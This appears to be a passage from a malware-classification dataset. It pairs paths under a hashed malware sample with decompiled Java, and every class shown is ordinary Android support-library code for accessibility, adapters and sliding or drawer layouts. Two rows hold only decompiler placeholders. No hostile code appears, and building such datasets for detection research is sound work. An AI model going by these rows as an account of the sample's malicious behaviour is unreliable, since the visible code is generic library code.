}   @Override public void setScrollable(  Object record,  boolean scrollable){     AccessibilityRecordCompatIcs.setScrollable(record,scrollable);   }   @Override public void setSource(  Object record,  View source){     AccessibilityRecordCompatIcs.setSource(record,source);   }   @Override public void setToIndex(  Object record,  int toIndex){     AccessibilityRecordCompatIcs.setToIndex(record,toIndex);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view.accessibility\AccessibilityRecordIcsMr1Impl.code","static class AccessibilityRecordIcsMr1Impl extends AccessibilityRecordIcsImpl {   AccessibilityRecordIcsMr1Impl(){   }   @Override public int getMaxScrollX(  Object record){     return AccessibilityRecordCompatIcsMr1.getMaxScrollX(record);   }   @Override public int getMaxScrollY(  Object record){     return AccessibilityRecordCompatIcsMr1.getMaxScrollY(record);   }   @Override public void setMaxScrollX(  Object record,  int maxScrollX){     AccessibilityRecordCompatIcsMr1.setMaxScrollX(record,maxScrollX);   }   @Override public void setMaxScrollY(  Object record,  int maxScrollY){     AccessibilityRecordCompatIcsMr1.setMaxScrollY(record,maxScrollY);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view.accessibility\AccessibilityRecordImpl.code","interface AccessibilityRecordImpl {   int getAddedCount(  Object obj);   CharSequence getBeforeText(  Object obj);   CharSequence getClassName(  Object obj);   CharSequence getContentDescription(  Object obj);   int getCurrentItemIndex(  Object obj);   int getFromIndex(  Object obj);   int getItemCount(  Object obj);   int getMaxScrollX(  Object obj);   int getMaxScrollY(  Object obj);   Parcelable getParcelableData(  Object obj);   int getRemovedCount(  Object obj);   int getScrollX(  Object obj);   int getScrollY(  Object obj);   AccessibilityNodeInfoCompat getSource(  Object obj);   List<CharSequence> getText(  Object obj);   int getToIndex(  Object obj);   int getWindowId(  Object obj);   boolean isChecked(  Object obj);   boolean isEnabled(  Object obj);   boolean isFullScreen(  Object obj);   boolean isPassword(  Object obj);   boolean isScrollable(  Object obj);   Object obtain();   Object obtain(  Object obj);   void recycle(  Object obj);   void setAddedCount(  Object obj,  int i);   void setBeforeText(  Object obj,  CharSequence charSequence);   void setChecked(  Object obj,  boolean z);   void setClassName(  Object obj,  CharSequence charSequence);   void setContentDescription(  Object obj,  CharSequence charSequence);   void setCurrentItemIndex(  Object obj,  int i);   void setEnabled(  Object obj,  boolean z);   void setFromIndex(  Object obj,  int i);   void setFullScreen(  Object obj,  boolean z);   void setItemCount(  Object obj,  int i);   void setMaxScrollX(  Object obj,  int i);   void setMaxScrollY(  Object obj,  int i);   void setParcelableData(  Object obj,  Parcelable parcelable);   void setPassword(  Object obj,  boolean z);   void setRemovedCount(  Object obj,  int i);   void setScrollX(  Object obj,  int i);   void setScrollY(  Object obj,  int i);   void setScrollable(  Object obj,  boolean z);   void setSource(  Object obj,  View view);   void setSource(  Object obj,  View view,  int i);   void setToIndex(  Object obj,  int i); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view.accessibility\AccessibilityRecordJellyBeanImpl.code","static class AccessibilityRecordJellyBeanImpl extends AccessibilityRecordIcsMr1Impl {   AccessibilityRecordJellyBeanImpl(){   }   @Override public void setSource(  Object record,  View root,  int virtualDescendantId){     AccessibilityRecordCompatJellyBean.setSource(record,root,virtualDescendantId);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view.accessibility\AccessibilityRecordStubImpl.code","static class AccessibilityRecordStubImpl implements AccessibilityRecordImpl {   AccessibilityRecordStubImpl(){   }   @Override public Object obtain(){     return null;   }   @Override public Object obtain(  Object record){     return null;   }   @Override public int getAddedCount(  Object record){     return 0;   }   @Override public CharSequence getBeforeText(  Object record){     return null;   }   @Override public CharSequence getClassName(  Object record){     return null;   }   @Override public CharSequence getContentDescription(  Object record){     return null;   }   @Override public int getCurrentItemIndex(  Object record){     return 0;   }   @Override public int getFromIndex(  Object record){     return 0;   }   @Override public int getItemCount(  Object record){     return 0;   }   @Override public int getMaxScrollX(  Object record){     return 0;   }   @Override public int getMaxScrollY(  Object record){     return 0;   }   @Override public Parcelable getParcelableData(  Object record){     return null;   }   @Override public int getRemovedCount(  Object record){     return 0;   }   @Override public int getScrollX(  Object record){     return 0;   }   @Override public int getScrollY(  Object record){     return 0;   }   @Override public AccessibilityNodeInfoCompat getSource(  Object record){     return null;   }   @Override public List<CharSequence> getText(  Object record){     return Collections.emptyList();   }   @Override public int getToIndex(  Object record){     return 0;   }   @Override public int getWindowId(  Object record){     return 0;   }   @Override public boolean isChecked(  Object record){     return false;   }   @Override public boolean isEnabled(  Object record){     return false;   }   @Override public boolean isFullScreen(  Object record){     return false;   }   @Override public boolean isPassword(  Object record){     return false;   }   @Override public boolean isScrollable(  Object record){     return false;   }   @Override public void recycle(  Object record){   }   @Override public void setAddedCount(  Object record,  int addedCount){   }   @Override public void setBeforeText(  Object record,  CharSequence beforeText){   }   @Override public void setChecked(  Object record,  boolean isChecked){   }   @Override public void setClassName(  Object record,  CharSequence className){   }   @Override public void setContentDescription(  Object record,  CharSequence contentDescription){   }   @Override public void setCurrentItemIndex(  Object record,  int currentItemIndex){   }   @Override public void setEnabled(  Object record,  boolean isEnabled){   }   @Override public void setFromIndex(  Object record,  int fromIndex){   }   @Override public void setFullScreen(  Object record,  boolean isFullScreen){   }   @Override public void setItemCount(  Object record,  int itemCount){   }   @Override public void setMaxScrollX(  Object record,  int maxScrollX){   }   @Override public void setMaxScrollY(  Object record,  int maxScrollY){   }   @Override public void setParcelableData(  Object record,  Parcelable parcelableData){   }   @Override public void setPassword(  Object record,  boolean isPassword){   }   @Override public void setRemovedCount(  Object record,  int removedCount){   }   @Override public void setScrollX(  Object record,  int scrollX){   }   @Override public void setScrollY(  Object record,  int scrollY){   }   @Override public void setScrollable(  Object record,  boolean scrollable){   }   @Override public void setSource(  Object record,  View source){   }   @Override public void setSource(  Object record,  View root,  int virtualDescendantId){   }   @Override public void setToIndex(  Object record,  int toIndex){   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view.accessibility\AccessibilityStateChangeListenerBridge.code","interface AccessibilityStateChangeListenerBridge {   void onAccessibilityStateChanged(  boolean z); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view.accessibility\AccessibilityStateChangeListenerCompat.code","public static abstract class AccessibilityStateChangeListenerCompat {   final Object mListener=AccessibilityManagerCompat.IMPL.newAccessiblityStateChangeListener(this);   public abstract void onAccessibilityStateChanged(  boolean z); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.widget\AccessibilityDelegate.code","class AccessibilityDelegate extends AccessibilityDelegateCompat {   private final Rect mTmpRect=new Rect();   AccessibilityDelegate(){   }   @Override public void onInitializeAccessibilityNodeInfo(  View host,  AccessibilityNodeInfoCompat info){     AccessibilityNodeInfoCompat superNode=AccessibilityNodeInfoCompat.obtain(info);     super.onInitializeAccessibilityNodeInfo(host,superNode);     info.setSource(host);     Object parentForAccessibility=ViewCompat.getParentForAccessibility(host);     if (parentForAccessibility instanceof View) {       info.setParent((View)parentForAccessibility);     }     copyNodeInfoNoChildren(info,superNode);     superNode.recycle();     addChildrenForAccessibility(info,(ViewGroup)host);   }   private void addChildrenForAccessibility(  AccessibilityNodeInfoCompat info,  ViewGroup v){     int childCount=v.getChildCount();     for (int i=0; i < childCount; i++) {       View child=v.getChildAt(i);       if (!filter(child)) {         int importance=ViewCompat.getImportantForAccessibility(child); switch (importance) { case 0:           ViewCompat.setImportantForAccessibility(child,1);         break; case 2:       if (child instanceof ViewGroup) {         addChildrenForAccessibility(info,(ViewGroup)child);         break;       }  else {         continue;       }   }   info.addChild(child); } } } @Override public boolean onRequestSendAccessibilityEvent(ViewGroup host,View child,AccessibilityEvent event){ return !filter(child) ? super.onRequestSendAccessibilityEvent(host,child,event) : DrawerLayout.ALLOW_EDGE_LOCK; } public boolean filter(View child){ View openDrawer=DrawerLayout.this.findOpenDrawer(); return (openDrawer == null || openDrawer == child) ? DrawerLayout.ALLOW_EDGE_LOCK : DrawerLayout.CHILDREN_DISALLOW_INTERCEPT; } private void copyNodeInfoNoChildren(AccessibilityNodeInfoCompat dest,AccessibilityNodeInfoCompat src){ Rect rect=this.mTmpRect; src.getBoundsInParent(rect); dest.setBoundsInParent(rect); src.getBoundsInScreen(rect); dest.setBoundsInScreen(rect); dest.setVisibleToUser(src.isVisibleToUser()); dest.setPackageName(src.getPackageName()); dest.setClassName(src.getClassName()); dest.setContentDescription(src.getContentDescription()); dest.setEnabled(src.isEnabled()); dest.setClickable(src.isClickable()); dest.setFocusable(src.isFocusable()); dest.setFocused(src.isFocused()); dest.setAccessibilityFocused(src.isAccessibilityFocused()); dest.setSelected(src.isSelected()); dest.setLongClickable(src.isLongClickable()); dest.addAction(src.getActions()); } } class AccessibilityDelegate extends AccessibilityDelegateCompat {   private final Rect mTmpRect=new Rect();   AccessibilityDelegate(){   }   @Override public void onInitializeAccessibilityNodeInfo(  View host,  AccessibilityNodeInfoCompat info){     AccessibilityNodeInfoCompat superNode=AccessibilityNodeInfoCompat.obtain(info);     super.onInitializeAccessibilityNodeInfo(host,superNode);     copyNodeInfoNoChildren(info,superNode);     superNode.recycle();     info.setClassName(SlidingPaneLayout.class.getName());     info.setSource(host);     Object parentForAccessibility=ViewCompat.getParentForAccessibility(host);     if (parentForAccessibility instanceof View) {       info.setParent((View)parentForAccessibility);     }     int childCount=SlidingPaneLayout.this.getChildCount();     for (int i=0; i < childCount; i++) {       View child=SlidingPaneLayout.this.getChildAt(i);       if (!filter(child) && child.getVisibility() == 0) {         ViewCompat.setImportantForAccessibility(child,1);         info.addChild(child);       }     }   }   @Override public void onInitializeAccessibilityEvent(  View host,  AccessibilityEvent event){     super.onInitializeAccessibilityEvent(host,event);     event.setClassName(SlidingPaneLayout.class.getName());   }   @Override public boolean onRequestSendAccessibilityEvent(  ViewGroup host,  View child,  AccessibilityEvent event){     if (filter(child)) {       return false;     }     return super.onRequestSendAccessibilityEvent(host,child,event);   }   public boolean filter(  View child){     return SlidingPaneLayout.this.isDimmed(child);   }   private void copyNodeInfoNoChildren(  AccessibilityNodeInfoCompat dest,  AccessibilityNodeInfoCompat src){     Rect rect=this.mTmpRect;     src.getBoundsInParent(rect);     dest.setBoundsInParent(rect);     src.getBoundsInScreen(rect);     dest.setBoundsInScreen(rect);     dest.setVisibleToUser(src.isVisibleToUser());     dest.setPackageName(src.getPackageName());     dest.setClassName(src.getClassName());     dest.setContentDescription(src.getContentDescription());     dest.setEnabled(src.isEnabled());     dest.setClickable(src.isClickable());     dest.setFocusable(src.isFocusable());     dest.setFocused(src.isFocused());     dest.setAccessibilityFocused(src.isAccessibilityFocused());     dest.setSelected(src.isSelected());     dest.setLongClickable(src.isLongClickable());     dest.addAction(src.getActions());     dest.setMovementGranularities(src.getMovementGranularities());   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.widget\AutoScrollHelper.code","!org.eclipse.jdt.core.dom.TypeDeclaration@6a783093"
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.widget\BaseEdgeEffectImpl.code","static class BaseEdgeEffectImpl implements EdgeEffectImpl {   BaseEdgeEffectImpl(){   }   @Override public Object newEdgeEffect(  Context context){     return null;   }   @Override public void setSize(  Object edgeEffect,  int width,  int height){   }   @Override public boolean isFinished(  Object edgeEffect){     return true;   }   @Override public void finish(  Object edgeEffect){   }   @Override public boolean onPull(  Object edgeEffect,  float deltaDistance){     return false;   }   @Override public boolean onRelease(  Object edgeEffect){     return false;   }   @Override public boolean onAbsorb(  Object edgeEffect,  int velocity){     return false;   }   @Override public boolean draw(  Object edgeEffect,  Canvas canvas){     return false;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.widget\BaseListPopupWindowImpl.code","static class BaseListPopupWindowImpl implements ListPopupWindowImpl {   BaseListPopupWindowImpl(){   }   @Override public View.OnTouchListener createDragToOpenListener(  Object listPopupWindow,  View src){     return null;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.widget\BasePopupMenuImpl.code","static class BasePopupMenuImpl implements PopupMenuImpl {   BasePopupMenuImpl(){   }   @Override public View.OnTouchListener getDragToOpenListener(  Object popupMenu){     return null;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.widget\Callback.code","public static abstract class Callback {   public abstract boolean tryCaptureView(  View view,  int i);   public void onViewDragStateChanged(  int state){   }   public void onViewPositionChanged(  View changedView,  int left,  int top,  int dx,  int dy){   }   public void onViewCaptured(  View capturedChild,  int activePointerId){   }   public void onViewReleased(  View releasedChild,  float xvel,  float yvel){   }   public void onEdgeTouched(  int edgeFlags,  int pointerId){   }   public boolean onEdgeLock(  int edgeFlags){     return false;   }   public void onEdgeDragStarted(  int edgeFlags,  int pointerId){   }   public int getOrderedChildIndex(  int index){     return index;   }   public int getViewHorizontalDragRange(  View child){     return 0;   }   public int getViewVerticalDragRange(  View child){     return 0;   }   public int clampViewPositionHorizontal(  View child,  int left,  int dx){     return 0;   }   public int clampViewPositionVertical(  View child,  int top,  int dy){     return 0;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.widget\ChangeObserver.code","public class ChangeObserver extends ContentObserver {   public ChangeObserver(){     super(new Handler());   }   @Override public boolean deliverSelfNotifications(){     return true;   }   @Override public void onChange(  boolean selfChange){     CursorAdapter.this.onContentChanged();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.widget\ClampedScroller.code","public static class ClampedScroller {   private int mEffectiveRampDown;   private int mRampDownDuration;   private int mRampUpDuration;   private float mStopValue;   private float mTargetVelocityX;   private float mTargetVelocityY;   private long mStartTime=Long.MIN_VALUE;   private long mStopTime=-1;   private long mDeltaTime=0;   private int mDeltaX=0;   private int mDeltaY=0;   public void setRampUpDuration(  int durationMillis){     this.mRampUpDuration=durationMillis;   }   public void setRampDownDuration(  int durationMillis){     this.mRampDownDuration=durationMillis;   }   public void start(){     this.mStartTime=AnimationUtils.currentAnimationTimeMillis();     this.mStopTime=-1L;     this.mDeltaTime=this.mStartTime;     this.mStopValue=0.5f;     this.mDeltaX=0;     this.mDeltaY=0;   }   public void requestStop(){     long currentTime=AnimationUtils.currentAnimationTimeMillis();     this.mEffectiveRampDown=AutoScrollHelper.constrain((int)(currentTime - this.mStartTime),0,this.mRampDownDuration);     this.mStopValue=getValueAt(currentTime);     this.mStopTime=currentTime;   }   public boolean isFinished(){     return this.mStopTime > 0 && AnimationUtils.currentAnimationTimeMillis() > this.mStopTime + ((long)this.mEffectiveRampDown);   }   private float getValueAt(  long currentTime){     if (currentTime < this.mStartTime) {       return 0.0f;     }     if (this.mStopTime < 0 || currentTime < this.mStopTime) {       long elapsedSinceStart=currentTime - this.mStartTime;       return AutoScrollHelper.constrain(((float)elapsedSinceStart) / this.mRampUpDuration,0.0f,AutoScrollHelper.DEFAULT_RELATIVE_VELOCITY) * 0.5f;     }     long elapsedSinceEnd=currentTime - this.mStopTime;     return (AutoScrollHelper.constrain(((float)elapsedSinceEnd) / this.mEffectiveRampDown,0.0f,AutoScrollHelper.DEFAULT_RELATIVE_VELOCITY) * this.mStopValue) + (AutoScrollHelper.DEFAULT_RELATIVE_VELOCITY - this.mStopValue);   }   private float interpolateValue(  float value){     return ((-4.0f) * value * value) + (4.0f * value);   }   public void computeScrollDelta(){     if (this.mDeltaTime == 0) {       throw new RuntimeException(""Cannot compute scroll delta before calling start()"");     }     long currentTime=AnimationUtils.currentAnimationTimeMillis();     float value=getValueAt(currentTime);     float scale=interpolateValue(value);     long elapsedSinceDelta=currentTime - this.mDeltaTime;     this.mDeltaTime=currentTime;     this.mDeltaX=(int)(((float)elapsedSinceDelta) * scale * this.mTargetVelocityX);     this.mDeltaY=(int)(((float)elapsedSinceDelta) * scale * this.mTargetVelocityY);   }   public void setTargetVelocity(  float x,  float y){     this.mTargetVelocityX=x;     this.mTargetVelocityY=y;   }   public int getHorizontalDirection(){     return (int)(this.mTargetVelocityX / Math.abs(this.mTargetVelocityX));   }   public int getVerticalDirection(){     return (int)(this.mTargetVelocityY / Math.abs(this.mTargetVelocityY));   }   public int getDeltaX(){     return this.mDeltaX;   }   public int getDeltaY(){     return this.mDeltaY;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.widget\ContentLoadingProgressBar.code","public class ContentLoadingProgressBar extends ProgressBar {   private static final int MIN_DELAY=500;   private static final int MIN_SHOW_TIME=500;   private final Runnable mDelayedHide;   private final Runnable mDelayedShow;   private boolean mDismissed;   private boolean mPostedHide;   private boolean mPostedShow;   private long mStartTime;   public ContentLoadingProgressBar(  Context context){     this(context,null);   }   public ContentLoadingProgressBar(  Context context,  AttributeSet attrs){     super(context,attrs,0);     this.mStartTime=-1L;     this.mPostedHide=false;     this.mPostedShow=false;     this.mDismissed=false;     this.mDelayedHide=new Runnable(){       @Override public void run(){         ContentLoadingProgressBar.this.mPostedHide=false;         ContentLoadingProgressBar.this.mStartTime=-1L;         ContentLoadingProgressBar.this.setVisibility(8);       }     } ;     this.mDelayedShow=new Runnable(){       @Override public void run(){         ContentLoadingProgressBar.this.mPostedShow=false;         if (!ContentLoadingProgressBar.this.mDismissed) {           ContentLoadingProgressBar.this.mStartTime=System.currentTimeMillis();           ContentLoadingProgressBar.this.setVisibility(0);         }       }     } ;   }   @Override public void onAttachedToWindow(){     super.onAttachedToWindow();     removeCallbacks();   }   @Override public void onDetachedFromWindow(){     super.onDetachedFromWindow();     removeCallbacks();   }   private void removeCallbacks(){     removeCallbacks(this.mDelayedHide);     removeCallbacks(this.mDelayedShow);   }   public void hide(){     this.mDismissed=true;     removeCallbacks(this.mDelayedShow);     long diff=System.currentTimeMillis() - this.mStartTime;     if (diff >= 500 || this.mStartTime == -1) {       setVisibility(8);     }  else     if (!this.mPostedHide) {       postDelayed(this.mDelayedHide,500 - diff);       this.mPostedHide=true;     }   }   public void show(){     this.mStartTime=-1L;     this.mDismissed=false;     removeCallbacks(this.mDelayedHide);     if (!this.mPostedShow) {       postDelayed(this.mDelayedShow,500L);       this.mPostedShow=true;     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.widget\CursorAdapter.code","public abstract class CursorAdapter extends BaseAdapter implements Filterable, CursorFilter.CursorFilterClient {   @Deprecated public static final int FLAG_AUTO_REQUERY=1;   public static final int FLAG_REGISTER_CONTENT_OBSERVER=2;   protected boolean mAutoRequery;   protected ChangeObserver mChangeObserver;   protected Context mContext;   protected Cursor mCursor;   protected CursorFilter mCursorFilter;   protected DataSetObserver mDataSetObserver;   protected boolean mDataValid;   protected FilterQueryProvider mFilterQueryProvider;   protected int mRowIDColumn;   public abstract void bindView(  View view,  Context context,  Cursor cursor);   public abstract View newView(  Context context,  Cursor cursor,  ViewGroup viewGroup);   @Deprecated public CursorAdapter(  Context context,  Cursor c){     init(context,c,1);   }   public CursorAdapter(  Context context,  Cursor c,  boolean autoRequery){     init(context,c,autoRequery ? 1 : 2);   }   public CursorAdapter(  Context context,  Cursor c,  int flags){     init(context,c,flags);   }   @Deprecated protected void init(  Context context,  Cursor c,  boolean autoRequery){     init(context,c,autoRequery ? 1 : 2);   }   void init(  Context context,  Cursor c,  int flags){     if ((flags & 1) == 1) {       flags|=2;       this.mAutoRequery=true;     }  else {       this.mAutoRequery=false;     }     boolean cursorPresent=c != null;     this.mCursor=c;     this.mDataValid=cursorPresent;     this.mContext=context;     this.mRowIDColumn=cursorPresent ? c.getColumnIndexOrThrow(""_id"") : -1;     if ((flags & 2) == 2) {       this.mChangeObserver=new ChangeObserver();       this.mDataSetObserver=new MyDataSetObserver();     }  else {       this.mChangeObserver=null;       this.mDataSetObserver=null;     }     if (cursorPresent) {       if (this.mChangeObserver != null) {         c.registerContentObserver(this.mChangeObserver);       }       if (this.mDataSetObserver != null) {         c.registerDataSetObserver(this.mDataSetObserver);       }     }   }   @Override public Cursor getCursor(){     return this.mCursor;   }   @Override public int getCount(){     if (!this.mDataValid || this.mCursor == null) {       return 0;     }     return this.mCursor.getCount();   }   @Override public Object getItem(  int position){     if (!this.mDataValid || this.mCursor == null) {       return null;     }     this.mCursor.moveToPosition(position);     return this.mCursor;   }   @Override public long getItemId(  int position){     if (this.mDataValid && this.mCursor != null && this.mCursor.moveToPosition(position)) {       return this.mCursor.getLong(this.mRowIDColumn);     }     return 0L;   }   @Override public boolean hasStableIds(){     return true;   }   @Override public View getView(  int position,  View convertView,  ViewGroup parent){     View v;     if (!this.mDataValid) {       throw new IllegalStateException(""this should only be called when the cursor is valid"");     }     if (!this.mCursor.moveToPosition(position)) {       throw new IllegalStateException(""couldn't move cursor to position "" + position);     }     if (convertView == null) {       v=newView(this.mContext,this.mCursor,parent);     }  else {       v=convertView;     }     bindView(v,this.mContext,this.mCursor);     return v;   }   @Override public View getDropDownView(  int position,  View convertView,  ViewGroup parent){     View v;     if (this.mDataValid) {       this.mCursor.moveToPosition(position);       if (convertView == null) {         v=newDropDownView(this.mContext,this.mCursor,parent);       }  else {         v=convertView;       }       bindView(v,this.mContext,this.mCursor);       return v;     }     return null;   }   public View newDropDownView(  Context context,  Cursor cursor,  ViewGroup parent){     return newView(context,cursor,parent);   }   @Override public void changeCursor(  Cursor cursor){     Cursor old=swapCursor(cursor);     if (old != null) {       old.close();     }   }   public Cursor swapCursor(  Cursor newCursor){     if (newCursor == this.mCursor) {       return null;     }     Cursor oldCursor=this.mCursor;     if (oldCursor != null) {       if (this.mChangeObserver != null) {         oldCursor.unregisterContentObserver(this.mChangeObserver);       }       if (this.mDataSetObserver != null) {         oldCursor.unregisterDataSetObserver(this.mDataSetObserver);       }     }     this.mCursor=newCursor;     if (newCursor != null) {       if (this.mChangeObserver != null) {         newCursor.registerContentObserver(this.mChangeObserver);       }       if (this.mDataSetObserver != null) {         newCursor.registerDataSetObserver(this.mDataSetObserver);       }       this.mRowIDColumn=newCursor.getColumnIndexOrThrow(""_id"");       this.mDataValid=true;       notifyDataSetChanged();       return oldCursor;     }     this.mRowIDColumn=-1;     this.mDataValid=false;     notifyDataSetInvalidated();     return oldCursor;   }   @Override public CharSequence convertToString(  Cursor cursor){     return cursor == null ? """" : cursor.toString();   }   @Override public Cursor runQueryOnBackgroundThread(  CharSequence constraint){     return this.mFilterQueryProvider != null ? this.mFilterQueryProvider.runQuery(constraint) : this.mCursor;   }   @Override public Filter getFilter(){     if (this.mCursorFilter == null) {       this.mCursorFilter=new CursorFilter(this);     }     return this.mCursorFilter;   }   public FilterQueryProvider getFilterQueryProvider(){     return this.mFilterQueryProvider;   }   public void setFilterQueryProvider(  FilterQueryProvider filterQueryProvider){     this.mFilterQueryProvider=filterQueryProvider;   }   protected void onContentChanged(){     if (this.mAutoRequery && this.mCursor != null && !this.mCursor.isClosed()) {       this.mDataValid=this.mCursor.requery();     }   } public class ChangeObserver extends ContentObserver {     public ChangeObserver(){       super(new Handler());     }     @Override public boolean deliverSelfNotifications(){       return true;     }     @Override public void onChange(    boolean selfChange){       CursorAdapter.this.onContentChanged();     }   } public class MyDataSetObserver extends DataSetObserver {     private MyDataSetObserver(){     }     @Override public void onChanged(){       CursorAdapter.this.mDataValid=true;       CursorAdapter.this.notifyDataSetChanged();     }     @Override public void onInvalidated(){       CursorAdapter.this.mDataValid=false;       CursorAdapter.this.notifyDataSetInvalidated();     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.widget\CursorFilter.code","class CursorFilter extends Filter {   CursorFilterClient mClient; interface CursorFilterClient {     void changeCursor(    Cursor cursor);     CharSequence convertToString(    Cursor cursor);     Cursor getCursor();     Cursor runQueryOnBackgroundThread(    CharSequence charSequence);   }   public CursorFilter(  CursorFilterClient client){     this.mClient=client;   }   @Override public CharSequence convertResultToString(  Object resultValue){     return this.mClient.convertToString((Cursor)resultValue);   }   @Override protected Filter.FilterResults performFiltering(  CharSequence constraint){     Cursor cursor=this.mClient.runQueryOnBackgroundThread(constraint);     Filter.FilterResults results=new Filter.FilterResults();     if (cursor != null) {       results.count=cursor.getCount();       results.values=cursor;     }  else {       results.count=0;       results.values=null;     }     return results;   }   @Override protected void publishResults(  CharSequence constraint,  Filter.FilterResults results){     Cursor oldCursor=this.mClient.getCursor();     if (results.values != null && results.values != oldCursor) {       this.mClient.changeCursor((Cursor)results.values);     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.widget\CursorFilterClient.code","interface CursorFilterClient {   void changeCursor(  Cursor cursor);   CharSequence convertToString(  Cursor cursor);   Cursor getCursor();   Cursor runQueryOnBackgroundThread(  CharSequence charSequence); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.widget\CursorToStringConverter.code","public interface CursorToStringConverter {   CharSequence convertToString(  Cursor cursor); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.widget\DisableLayerRunnable.code","public class DisableLayerRunnable implements Runnable {   final View mChildView;   DisableLayerRunnable(  View childView){     this.mChildView=childView;   }   @Override public void run(){     if (this.mChildView.getParent() == SlidingPaneLayout.this) {       ViewCompat.setLayerType(this.mChildView,0,null);       SlidingPaneLayout.this.invalidateChildRegion(this.mChildView);     }     SlidingPaneLayout.this.mPostedRunnables.remove(this);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.widget\DragHelperCallback.code","private class DragHelperCallback extends ViewDragHelper.Callback {   private DragHelperCallback(){   }   @Override public boolean tryCaptureView(  View child,  int pointerId){     if (SlidingPaneLayout.this.mIsUnableToDrag) {       return false;     }     return ((LayoutParams)child.getLayoutParams()).slideable;   }   @Override public void onViewDragStateChanged(  int state){     if (SlidingPaneLayout.this.mDragHelper.getViewDragState() == 0) {       if (SlidingPaneLayout.this.mSlideOffset == 0.0f) {         SlidingPaneLayout.this.updateObscuredViewsVisibility(SlidingPaneLayout.this.mSlideableView);         SlidingPaneLayout.this.dispatchOnPanelClosed(SlidingPaneLayout.this.mSlideableView);         SlidingPaneLayout.this.mPreservedOpenState=false;       }  else {         SlidingPaneLayout.this.dispatchOnPanelOpened(SlidingPaneLayout.this.mSlideableView);         SlidingPaneLayout.this.mPreservedOpenState=true;       }     }   }   @Override public void onViewCaptured(  View capturedChild,  int activePointerId){     SlidingPaneLayout.this.setAllChildrenVisible();   }   @Override public void onViewPositionChanged(  View changedView,  int left,  int top,  int dx,  int dy){     SlidingPaneLayout.this.onPanelDragged(left);     SlidingPaneLayout.this.invalidate();   }   @Override public void onViewReleased(  View releasedChild,  float xvel,  float yvel){     LayoutParams lp=(LayoutParams)releasedChild.getLayoutParams();     int left=SlidingPaneLayout.this.getPaddingLeft() + lp.leftMargin;     if (xvel > 0.0f || (xvel == 0.0f && SlidingPaneLayout.this.mSlideOffset > 0.5f)) {       left+=SlidingPaneLayout.this.mSlideRange;     }     SlidingPaneLayout.this.mDragHelper.settleCapturedViewAt(left,releasedChild.getTop());     SlidingPaneLayout.this.invalidate();   }   @Override public int getViewHorizontalDragRange(  View child){     return SlidingPaneLayout.this.mSlideRange;   }   @Override public int clampViewPositionHorizontal(  View child,  int left,  int dx){     LayoutParams lp=(LayoutParams)SlidingPaneLayout.this.mSlideableView.getLayoutParams();     int leftBound=SlidingPaneLayout.this.getPaddingLeft() + lp.leftMargin;     int rightBound=leftBound + SlidingPaneLayout.this.mSlideRange;     int newLeft=Math.min(Math.max(left,leftBound),rightBound);     return newLeft;   }   @Override public void onEdgeDragStarted(  int edgeFlags,  int pointerId){     SlidingPaneLayout.this.mDragHelper.captureChildView(SlidingPaneLayout.this.mSlideableView,pointerId);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.widget\DrawerLayout.code","!org.eclipse.jdt.core.dom.TypeDeclaration@4c71a71f"
